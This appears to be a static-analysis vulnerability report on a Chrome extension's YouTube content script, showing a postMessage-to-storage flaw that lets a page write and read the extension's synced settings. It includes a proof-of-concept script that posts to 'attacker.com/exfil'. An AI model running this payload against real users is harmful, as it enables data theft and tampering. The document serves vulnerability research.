# CoCo Analysis: cdapnbiifmnajacjlfiikicefmidkbdl

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (cs_window_eventListener_message → chrome_storage_sync_set_sink)

---

## Sink 1 & 2: cs_window_eventListener_message → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/cdapnbiifmnajacjlfiikicefmidkbdl/opgen_generated_files/cs_0.js
Line 624 - window.addEventListener('message', function({ data }) {
Line 628 - Object.keys(data.settings).forEach(name => {
Line 629 - const value = data.settings[name];

**Code:**

```javascript
// Content script settings initialization (cs_0.js lines 565-579)
const settings = {
  settingName1: defaultValue1,
  settingName2: defaultValue2,
  // ... more settings
};

// Load settings from storage and post to page
(async () => {
  for(let name of Object.keys(settings)) {
    const value = await getSetting(name); // ← reads from storage
    if(value !== undefined) {
      settings[name] = value;
    }
  }

  const scripts = [
    chrome.extension.getURL('scripts/contentscript.js')
  ]
  scripts.forEach((path) => {
    const s = document.createElement('script')
    s.src = path
    s.onload = () => {
      s.parentNode.removeChild(s);
      postSettings(); // ← posts ALL settings to page after loading
    }
  })
})

// Post settings to webpage (cs_0.js lines 573-580)
const postSettings = () => {
  window.postMessage({
    contentscript: 'youtube-subtitle',
    type: 'settings',
    settings: settings // ← ALL settings including attacker data posted to page
  }, "*");
};

// Storage getter (cs_0.js lines 550-558)
const getSetting = (name) => new Promise((resolve, reject) => {
  chrome.storage.sync.get([name], (result) => {
    if (chrome.runtime.lastError) {
      return reject(chrome.runtime.lastError);
    }
    resolve(result[name]); // ← returns value from storage
  });
});

// Storage setter (cs_0.js lines 545-548)
const setSetting = (name, value) => {
  chrome.storage.sync.set({ [name]: value }, () => {}); // ← writes to storage
};

// Settings changed from webpage - Entry point (cs_0.js lines 624-635)
window.addEventListener('message', function({ data }) {
  if(data.injectedscript !== 'youtube-subtitle') return; // ← easily bypassable check
  if(data.type === 'settings') {
    Object.keys(data.settings).forEach(name => { // ← attacker controls data.settings
      const value = data.settings[name]; // ← attacker-controlled value
      if(JSON.stringify(value) === JSON.stringify(settings[name])) return;
      settings[name] = value; // ← updates local settings
      setSetting(name, value); // ← writes attacker data to storage
    });
  }
}, true);
```

**Classification:** TRUE POSITIVE

**Exploitable by:** `https://www.youtube.com/*` (content script match pattern)

**Attack Vector:** window.postMessage from youtube.com webpage

**Attack:**

```javascript
// Stage 1: Write malicious data to storage
window.postMessage({
    injectedscript: 'youtube-subtitle',  // Bypass check
    type: 'settings',
    settings: {
        maliciousSetting: 'attacker_controlled_value',
        // Can overwrite any setting
        existingSetting: 'corrupted_value'
    }
}, '*');

// Stage 2: Read back the data
// The extension automatically posts ALL settings back via postSettings()
// after page load, so attacker can receive it:
window.addEventListener('message', function(event) {
    if (event.data &&
        event.data.contentscript === 'youtube-subtitle' &&
        event.data.type === 'settings') {
        console.log('Stolen settings:', event.data.settings);
        // Exfiltrate including any attacker-written and original data
        fetch('https://attacker.com/exfil', {
            method: 'POST',
            body: JSON.stringify(event.data.settings)
        });
    }
});
```

**Impact:** Complete storage exploitation chain on YouTube:
1. **Write**: Attacker can write arbitrary data to chrome.storage.sync by sending postMessage with `injectedscript: 'youtube-subtitle'` field
2. **Read**: Extension automatically posts all settings back to the page via `postSettings()` after initialization, allowing attacker to read all stored settings
3. **Data corruption**: Attacker can overwrite legitimate user settings, breaking extension functionality
4. **Information disclosure**: Attacker can read all user preferences and settings stored by the extension

This is a complete storage exploitation chain with both write and read capabilities accessible from YouTube.com.
